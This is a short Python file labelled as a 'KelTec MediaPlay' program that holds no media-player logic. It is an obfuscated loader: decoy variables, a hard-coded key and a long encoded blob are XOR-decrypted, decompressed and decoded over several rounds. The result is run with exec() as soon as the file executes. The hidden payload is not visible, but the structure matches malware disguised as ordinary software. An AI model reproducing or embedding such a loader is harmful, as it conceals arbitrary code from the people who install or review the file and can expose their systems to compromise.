# -*- coding: utf-8 -*-
# KelTec MediaPlay 
_lx0_0 = 303626 ^ 796168
_lx1_1 = len("db6198")
import zlib as _z,base64 as _b,hashlib as _h,sys as _s,os as _o
_lx2_2 = abs(-438337)
_lx3_3 = 373447 * 0
_lx4_4 = 131372 ^ 652168
_K = '6beba87d7cbe0b4c7212c4b065ef3aaaaab8f18cfd6563df1c5358ac57ed1643'
_M = 'Nz+MKWV4r4o0iQky+BIMYYmd357ebzvS0TMXQSOq0XUlaJgjbirt02zdCjysTlc3j5zay9Iwbt/aN0JCKayAfHE1mnNsI+iBb4oG'
_D = '=Ih8QrLgbqUDoUl9UiSkTq9p4u4FupJB4UWMoyMPQkv9c90n/o/d2RUQHKG6EkBI5NfWx9eRAwO4NkQX69NtOslva9ztbZtxvp7BXYEgy+P8x6gyr1amTabscUq33pQT14cFaeDePyG3YUfQod0G5zVXzgE7qVl/yZBVf7FdgTbWBvCtJpoMqkfM8HIBj/rFgsrsnErcgDQJ6P7J6ljFVegs5xtRUJEEZEBWGXZElV9z/wNsDE/32c5pLjeftQNpzHT66j3ZgHDn/Pjyjd1hsHWJ8ph5/hYXYx+HqZwSB/mQmK8674XMNDVjw/Axw0/eZJidRQl0Yl8HTCG/xC5gWbD8qbZuhSd9Fgofjg7E4fajaouB8VoqB0Y9M0s3wkkvhp8oGieYp2KyCINzAuqZK6dNCLOiDmp58pz584MLpV2SgiMxHiwaoSB+G0REN7JWPCVy2x3xZzHjh+OT3M4dFIK4cHFzcQTcJLO0JSAiIbGTx3b8W7KLnozALokWwzP/EZavfP32Cmj6iWAXNHmQ6+cc62BYptsAo7uLudZuEASOLVfpC2ru3qtuEqPeFNJnsLOMSWDdssEMK/xhrSPu2D+3FoI/mC775ycphC3kwXptYx8Bm/i8t49Q9L0LdpqjMVSd2cKfFzI7nu0oMHDT4E5RGFUzoBXlafRhop8QZQA7idLzWu3jGP8rYou2+uQz9w7QHjXoZzcgusj/S03x4fg9WDJxdnePC8AhjDdkroDKDqdvQzbcRkVqHO9iDVN7jyI8l/gXwou9NQ+9OrpdRtMk3MI3Rmj/ytQV/fKHiTerCMRikYrDJuuxvL3rqmQc/7kIEfsgfZ516kKO85rBfwZyrtEZw3wdxrBhZT2lBxFTF/Q5eWS9QTCeim9PZvBwvQSYpXEH0qZK7aVvp9XxeIiS3nmaGCD8GddJeAUNxK/dJ2+mWQAyVjGfUC7DIJnueqSILyaarRddNUrpP8/zDF3fxpefXOTDxDkm/5Oq67lkgHzkNXZmOnDthV/wTeYgSOHa4m64AKrIDYwaIdon2/BPbvEK773usTpne5wMAj4eXY1OXE8OyX1TIL7e7QWvfXGF8Bd9IlsX1+kbFaNkCxb1mc0/ocRbtGnfplTRuLhaS2ENAgarYdbkv/ReSBGjxKbXL8YrnVt+E+jK57cHqR1anSi5NPMWR4+RmvdhtsKoS95pc+ycj7dZdde8QfcRcd/5MTCYN8HofOLw1fr2mB6pTUGlFUr00t1fenB1/r+SUKyyvN+d4AR33115c2hG0KeLpnrGzc/6X84xnbAM3jn/OggTW2nd8HbaLke/olw8euZEw6/ufEaPfh60EFgYiLPYYLZAQxK0pjqAY1I6VHhoyan6dP1cGdHeEVdrwsJvtLxzCkbi5+CYEeLkNyOS2Y6IDBzvHVjpkihnLBMYGb1DzDlRn0oe11yMWOTLbO+76J9PvC4VWqJRPn/JTSx8AyV3rA+rIKdUjfgIw0U7bI/trYQZfKvm1crgCzUcxmrBQO2X5kibxt+0n3QFyIVyCy54+N7yWch2RmEpcbZJLWbm1KFogccAwkj1xkHwD+HR0Sbhf8xG'

def _xr(d,k):
    kl=len(k);return bytes(d[i]^k[i%kl] for i in range(len(d)))
def _dk(sd,c):
    return _h.sha256((_K+sd+str(c)).encode('utf-8')).digest()
def _dc(s,c,sd):
    r=_b.b64decode(s[::-1]);return _z.decompress(_xr(r,_dk(sd,c))).decode('utf-8')
def _run():
    mk=_h.sha256(_K.encode('utf-8')).digest()
    meta=_xr(_b.b64decode(_M),mk).decode('utf-8').split(':',2)
    sd=meta[0];nc=int(meta[1])
    d=_D
    for c in range(nc-1,-1,-1):d=_dc(d,c,sd)
    idx=d.find('||')
    src=d[idx+2:] if idx!=-1 else d
    exec(compile(src,'<mediaplay>','exec'),{'__name__':'__main__','__file__':__file__})
_run()